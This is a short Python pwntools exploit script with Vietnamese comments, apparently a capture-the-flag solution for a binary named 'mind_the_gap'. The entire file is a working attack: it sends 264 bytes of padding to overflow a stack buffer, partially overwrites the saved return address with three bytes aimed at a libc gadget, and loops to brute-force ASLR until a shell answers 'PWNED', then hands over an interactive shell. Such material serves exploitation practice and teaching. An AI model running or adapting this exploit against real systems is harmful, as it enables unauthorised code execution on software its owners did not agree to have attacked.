from pwn import *

# Tắt log mặc định để màn hình không bị trôi do vòng lặp
context.log_level = 'error'

# Gadget: 0x583ec
# Ghi đè 3 bytes: \xec \x83 \x05 (Giả sử 4 bit ngẫu nhiên của ASLR là 0)
partial_rip = b"\xec\x83\x05"

attempts = 0
print("[*] Đang tiến hành Brute-force ASLR (1/16)...")

while True:
    attempts += 1
    print(f"\r[+] Lần thử thứ: {attempts}", end="")
    
    try:
        # Nhớ cấu hình để dùng đúng libc 6MB của đề bài nhé!
        # p = process(["./ld-linux-x86-64.so.2", "./mind_the_gap"], env={"LD_PRELOAD": "./libc.so.6"})
        p = process('./mind_the_gap')
        
        # Buffer 256 bytes + 8 bytes saved RBP = 264 bytes
        payload = b"A" * 264
        payload += partial_rip
        
        p.send(payload)
        
        # Gửi thử một lệnh vào shell
        p.sendline(b"echo PWNED")
        
        # Chờ xem có chữ PWNED trả về không
        result = p.recvline(timeout=0.2)
        
        if b"PWNED" in result:
            print(f"\n[!] BINGO! Lấy được shell ở lần thử thứ {attempts}!")
            context.log_level = 'info'
            p.interactive() # Tương tác với shell
            break
            
        p.close()
    except EOFError:
        # Nếu crash, đóng tiến trình và thử lại
        p.close()
    except Exception as e:
        p.close()